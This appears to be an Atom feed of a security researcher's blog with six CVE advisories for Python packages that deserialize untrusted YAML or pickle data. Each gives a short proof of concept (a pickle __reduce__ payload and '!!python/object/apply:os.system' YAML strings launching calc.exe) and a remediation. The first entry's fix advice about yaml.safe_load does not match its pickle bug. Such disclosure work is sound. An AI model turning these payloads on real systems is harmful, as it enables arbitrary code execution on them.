<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Joel]]></title>
  <link href="http://joel-malwarebenchmark.github.io/atom.xml" rel="self"/>
  <link href="http://joel-malwarebenchmark.github.io/"/>
  <updated>2020-04-27T23:15:45+08:00</updated>
  <id>http://joel-malwarebenchmark.github.io/</id>
  <author>
    <name><![CDATA[Joel]]></name>
    <email><![CDATA[joelbenchmark@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CVE-2018-14572: vulnerability in conference-scheduler-cli]]></title>
    <link href="http://joel-malwarebenchmark.github.io/blog/2020/04/25/cve-2018-14572-conference-scheduler-cli/"/>
    <updated>2020-04-25T22:20:12+08:00</updated>
    <id>http://joel-malwarebenchmark.github.io/blog/2020/04/25/cve-2018-14572-conference-scheduler-cli</id>
    <content type="html"><![CDATA[<p><font size="4"><strong>Python Package:</strong>　　<a href="https://pypi.org/project/conference-scheduler-cli/">conference-scheduler-cli</a>  </font></p>

<p><font size="4"> <strong>Version:</strong>　　　　　 &lt;= 0.10.1 </font></p>

<p><font size="4"> <strong>Published:</strong>　　　　24 Jul 2018  </font></p>

<p><font size="4"> <strong>Reported by:</strong> 　　　　　 Joel  </font></p>

<p><font size="4"> <strong>CVE-2018-14572</strong> 　　　<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14572">CVE_details</a></font></p>

<h2>Overview</h2>

<p>In <code>conference-scheduler-cli</code>, a <code>pickle.load</code> call on imported data allows remote attackers to execute arbitrary code via a crafted .pickle file, as demonstrated by Python code that contains an <code>os.system</code> call.</p>

<h2>POC</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scheduler import io
</span><span class='line'>import os
</span><span class='line'>from pathlib import Path
</span><span class='line'>import pickle
</span><span class='line'>class joel_test(object):
</span><span class='line'>    def __reduce__(self):
</span><span class='line'>        import subprocess
</span><span class='line'>        return (subprocess.Popen, ('calc.exe',))
</span><span class='line'>test = joel_test()
</span><span class='line'>f=open('solution\\scheduler.pickle','wb')
</span><span class='line'>pickle.dump(test,f)
</span><span class='line'>f.close()
</span><span class='line'>io.import_schedule_definition(Path(Path.cwd(), 'solution'))
</span></code></pre></td></tr></table></div></figure>


<h2>Remediation</h2>

<p> It should use <code>yaml.safe_load</code> to parse yaml file.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2017-16764: vulnerability in django_make_app]]></title>
    <link href="http://joel-malwarebenchmark.github.io/blog/2017/11/12/cve-2017-16764-vulnerability-in-django-make-app/"/>
    <updated>2017-11-12T22:20:12+08:00</updated>
    <id>http://joel-malwarebenchmark.github.io/blog/2017/11/12/cve-2017-16764-vulnerability-in-django-make-app</id>
    <content type="html"><![CDATA[<p><font size="4"><strong>Python Package:</strong>　　<a href="https://pypi.python.org/pypi/django_make_app/">django_make_app</a>  </font></p>

<p><font size="4"> <strong>Version:</strong>　　　　　 Before 0.1.3  </font></p>

<p><font size="4"> <strong>Published:</strong>　　　　Nov. 10 th. 2017  </font></p>

<p><font size="4"> <strong>Reported by:</strong> 　　　　　 Joel  </font></p>

<p><font size="4"> <strong>CVE-2017-16764</strong> 　　　<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16764">CVE_details</a></font></p>

<h2>Overview</h2>

<p><code>Django_make_app</code> is Define models and fields using YAML and generate app for Django with views, forms, templates etc.  An issue was discovered in the <code>django_make_app</code> package before <code>0.1.3</code>.Untrusted data passed into the <code>read_yaml_file</code> function can execute arbitrary python commands resulting in command execution.</p>

<h2>POC</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from django_make_app.io_utils import read_yaml_file
</span><span class='line'>yaml_raw_data = read_yaml_file('joel.yml')
</span><span class='line'>#'joel.yml'：!!python/object/apply:os.system ["calc.exe"]
</span></code></pre></td></tr></table></div></figure>


<h2>Remediation</h2>

<p>At present, manufacturers have not yet related repair patch. It should use <code>yaml.safe_load</code> to parse yaml file.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[cve-2017-16763: configure loaded through Confire]]></title>
    <link href="http://joel-malwarebenchmark.github.io/blog/2017/11/12/cve-2017-16763-configure-loaded-through-confire/"/>
    <updated>2017-11-12T21:31:33+08:00</updated>
    <id>http://joel-malwarebenchmark.github.io/blog/2017/11/12/cve-2017-16763-configure-loaded-through-confire</id>
    <content type="html"><![CDATA[<p><font size="4"><strong>Python Package:</strong>　　<a href="https://pypi.python.org/pypi/confire/">confire</a>  </font></p>

<p><font size="4"> <strong>Version:</strong>　　　　　 Before 0.2.0  </font></p>

<p><font size="4"> <strong>Published:</strong>　　　　Nov. 10th. 2017  </font></p>

<p><font size="4"> <strong>Reported by:</strong> 　　　　　 Joel  </font></p>

<p><font size="4"> <strong>CVE-2017-16763</strong> 　　　<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16763">CVE_details</a></font></p>

<h2>Overview</h2>

<p><code>Confire</code> is a simple but powerful configuration scheme that builds on the configuration parsers of Scapy, elasticsearch, Django and others. Due to the user specific configuration was loaded from <code>~/.confire.yaml</code>
usinig <code>yaml.load()</code>, an issue was discovered in the <code>Confire</code> package before <code>0.2.0</code>.Untrusted data passed into the <code>confire.yaml</code> files can execute arbitrary python commands resulting in command execution.</p>

<h2>POC</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>class MyConfig(Configuration):
</span><span class='line'>  mysetting = True
</span><span class='line'>  logpath   = "/var/log/myapp.log"
</span><span class='line'>  appname   = "MyApp"
</span><span class='line'>settings = MyConfig.load()
</span><span class='line'>#CONF_PATHS = [
</span><span class='line'>#'/etc/confire.yaml',                    # The global configuration
</span><span class='line'>#os.path.expanduser('~/.confire.yaml'),  # User specific configuration
</span><span class='line'>#os.path.abspath('conf/confire.yaml')    # Local directory configuration
</span><span class='line'>#    ]
</span><span class='line'>#'~/.confire.yaml':!!python/object/apply:os.system ["calc.exe"]
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<h2>Remediation</h2>

<p>The updated versions of <code>confire</code> correctly use the <code>yaml.safe_load</code> method which prevents remote code execution.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2017-16615: Critical RESTful Web Applications Vulnerability]]></title>
    <link href="http://joel-malwarebenchmark.github.io/blog/2017/11/08/cve-2017-16615-critical-restful-web-applications-vulnerability/"/>
    <updated>2017-11-08T19:53:05+08:00</updated>
    <id>http://joel-malwarebenchmark.github.io/blog/2017/11/08/cve-2017-16615-critical-restful-web-applications-vulnerability</id>
    <content type="html"><![CDATA[<p><font size="4"><strong>Python Package:</strong>　　<a href="https://pypi.python.org/pypi/mlalchemy/">MLAlchemy</a>  </font></p>

<p><font size="4"> <strong>Version:</strong>　　　　　 Before 0.2.2  </font></p>

<p><font size="4"> <strong>Published:</strong>　　　　Nov. 7th. 2017  </font></p>

<p><font size="4"> <strong>Reported by:</strong> 　　　　　 Joel  </font></p>

<p><font size="4"> <strong>CVE-2017-16615</strong> 　　　<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16615">CVE_details</a> </font></p>

<h2>Overview</h2>

<p><code>MLAlchemy</code> is a Python-based utility library aimed at allowing relatively safe conversion from YAML/JSON to SQLAlchemy read-only queries. One use case here is to allow RESTful web applications (written in Python) to receive YAML- or JSON-based queries for data, e.g. from a front-end JavaScript-based application. By exploiting vulnerability, attackers can execute arbitrary python commands resulting in command execution. Due to a wide range of involved, the vulnerability is extremely dangerous.</p>

<p>An issue was discovered in the <code>MLAlchemy</code> package before <code>0.2.2</code>.Untrusted data passed into the <code>parse_yaml_query()</code> function can execute arbitrary python commands resulting in command execution.</p>

<h2>POC</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from mlalchemy import parse_yaml_query
</span><span class='line'>parse_yaml_query('!!python/object/apply:os.system ["calc.exe"]')
</span></code></pre></td></tr></table></div></figure>


<h5>Poc Video</h5>

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/AnjFmHI8FzY" frameborder="0" gesture="media" allowfullscreen></iframe></center>


<h2>Remediation</h2>

<p>The updated versions of <code>MLAlchemy (0.2.2)</code> correctly use the <code>yaml.safe_load</code> method which prevents remote code execution.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2017-16618: Convert through OwlMixin]]></title>
    <link href="http://joel-malwarebenchmark.github.io/blog/2017/11/08/cve-2017-16618-convert-through-owlmixin/"/>
    <updated>2017-11-08T19:36:30+08:00</updated>
    <id>http://joel-malwarebenchmark.github.io/blog/2017/11/08/cve-2017-16618-convert-through-owlmixin</id>
    <content type="html"><![CDATA[<p><font size="4"><strong>Python Package:</strong>　　<a href="https://pypi.python.org/pypi/owlmixin/">OwlMixin</a>  </font></p>

<p><font size="4"> <strong>Version:</strong>　　　　　 Before 2.0.0a12  </font></p>

<p><font size="4"> <strong>Published:</strong>　　　　Nov. 7th. 2017  </font></p>

<p><font size="4"> <strong>Reported by:</strong> 　　　　　 Joel  </font></p>

<p><font size="4"> <strong>CVE-2017-16618</strong> 　　　<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16618">CVE_details</a></font></p>

<h2>Overview</h2>

<p><code>OwlMixin</code> is a Library which converts data class instance and others each other.Recently,an issue was discovered in the <code>owlmixin</code> package before <code>2.0.0a12</code>.Untrusted data passed into the <code>load_yaml()</code> and the <code>load_yamlf()</code> functions can execute arbitrary python commands resulting in command execution.</p>

<h2>POC</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from owlmixin import util
</span><span class='line'>util.load_yaml('!!python/object/apply:os.system ["calc.exe"]')
</span><span class='line'>util.load_yamlf('joel.yml','utf-8')
</span><span class='line'>#'joel.yml'：!!python/object/apply:os.system ["calc.exe"]
</span></code></pre></td></tr></table></div></figure>


<h5>Poc Video</h5>

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/7K5Cu4U8xjA" frameborder="0" gesture="media" allowfullscreen></iframe></center>


<h2>Remediation</h2>

<p>The updated versions of <code>OwlMixin (2.0.0a12)</code> correctly use the <code>yaml.safe_load</code> method which prevents remote code execution.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2017-16616: YAMLParser in PyAnyAPI]]></title>
    <link href="http://joel-malwarebenchmark.github.io/blog/2017/11/08/cve-2017-16616-yamlparser-in-pyanyapi/"/>
    <updated>2017-11-08T17:30:12+08:00</updated>
    <id>http://joel-malwarebenchmark.github.io/blog/2017/11/08/cve-2017-16616-yamlparser-in-pyanyapi</id>
    <content type="html"><![CDATA[<p><font size="4"><strong>Python Package:</strong>　　<a href="https://pypi.python.org/pypi/pyanyapi/">PyAnyAPI</a>  </font></p>

<p><font size="4"> <strong>Version:</strong>　　　　　 Before 0.6.1  </font></p>

<p><font size="4"> <strong>Published:</strong>　　　　Nov. 7th. 2017  </font></p>

<p><font size="4"> <strong>Reported by:</strong> 　　　　　 Joel  </font></p>

<p><font size="4"> <strong>CVE-2017-16616</strong> 　　　<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16616">CVE_details</a></font></p>

<h2>Overview</h2>

<p><code>PyAnyAPI</code> is a Library for for convenient interface creation over various types of data in a declarative way. An issue was discovered in the <code>pyanapi</code> package before <code>0.6.1</code>.Untrusted data passed into the <code>yaml.load()</code> function can execute arbitrary python commands resulting in command execution.</p>

<h2>POC</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from pyanyapi import YAMLParser
</span><span class='line'>YAMLParser({'test': 'container &gt; test'}).parse('!!python/object/apply:os.system ["calc.exe"]').test
</span><span class='line'>YAMLParser({'test': 'container &gt; test'}).parse('!!python/object/new:subprocess.check_output [["calc.exe"]]').test</span></code></pre></td></tr></table></div></figure>


<h5>Poc Video</h5>

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/D15TTC7AWG4" frameborder="0" gesture="media" allowfullscreen></iframe></center>


<h2>Remediation</h2>

<p>The updated versions of <code>PyAnyAPI (0.6.1)</code> correctly use the <code>yaml.safe_load</code> method which prevents remote code execution.</p>
]]></content>
  </entry>
  
</feed>
